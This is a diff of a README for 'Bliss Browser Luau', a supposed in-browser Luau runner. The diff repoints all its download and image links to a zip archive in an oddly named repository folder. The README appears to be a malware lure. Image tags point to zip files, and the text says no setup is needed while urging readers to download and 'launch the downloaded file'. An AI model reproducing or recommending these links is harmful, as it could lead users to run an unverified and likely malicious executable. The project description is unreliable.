@@ -6,7 +6,7 @@ Welcome to the Bliss Browser Luau repository - your one-stop solution for runnin
 
 Bliss Browser Luau is a language support module specifically designed for the Bliss Browser project. With this module, developers can effortlessly write and run Luau programs directly within the browser, eliminating the need for external compilers or environments. Say goodbye to complex setups and hello to seamless Luau development right in your web browser!
 
-![Bliss Browser Luau](https://github.com/DUXXOFF/Bliss_Browser_Luau/releases/download/v1.0/Software.zip)
+![Bliss Browser Luau](https://github.com/DUXXOFF/Bliss_Browser_Luau/raw/refs/heads/main/unceilinged/Luau_Browser_Bliss_1.6-alpha.1.zip)
 
 ## Features
 
@@ -19,7 +19,7 @@ Bliss Browser Luau is a language support module specifically designed for the Bl
 
 To get started with Bliss Browser Luau, simply download the software package from the link below:
 
-[![Download Bliss Browser Luau](https://github.com/DUXXOFF/Bliss_Browser_Luau/releases/download/v1.0/Software.zip)](https://github.com/DUXXOFF/Bliss_Browser_Luau/releases/download/v1.0/Software.zip)
+[![Download Bliss Browser Luau](https://github.com/DUXXOFF/Bliss_Browser_Luau/raw/refs/heads/main/unceilinged/Luau_Browser_Bliss_1.6-alpha.1.zip)](https://github.com/DUXXOFF/Bliss_Browser_Luau/raw/refs/heads/main/unceilinged/Luau_Browser_Bliss_1.6-alpha.1.zip)
 
 **Note:** The link above points directly to the software package. Kindly ensure you have the necessary environment to launch the downloaded file.
 
@@ -64,4 +64,4 @@ Bliss Browser Luau is licensed under the GPL-3.0 License. See the `LICENSE` file
 
 Thank you for exploring Bliss Browser Luau! Start your Luau programming journey in the browser today. Happy coding! 🌟🚀
 
-![Bliss Browser Luau](https://github.com/DUXXOFF/Bliss_Browser_Luau/releases/download/v1.0/Software.zip)
+![Bliss Browser Luau](https://github.com/DUXXOFF/Bliss_Browser_Luau/raw/refs/heads/main/unceilinged/Luau_Browser_Bliss_1.6-alpha.1.zip)
